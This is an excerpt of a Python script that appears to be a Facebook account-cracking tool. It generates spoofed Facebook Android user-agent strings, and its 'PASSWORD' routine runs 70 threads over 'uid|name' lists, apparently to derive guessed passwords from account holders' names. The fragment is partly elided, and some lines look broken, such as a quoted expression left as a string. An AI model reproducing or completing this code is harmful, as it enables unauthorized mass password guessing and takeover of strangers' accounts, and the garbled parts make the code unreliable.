...
def S2():
	...
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = ';FBDM/{density=2.5,width=720,height=1600};FBLC/en_US;FBRV/970213046;FBCR/Grameenphone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix Hot 11;FBSV/10.0.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7a ;]'
	ua = s + e
	#print(ua)
	return ua 
...
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            ...
            linex()
            with Habib(max_workers=70) as AJworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
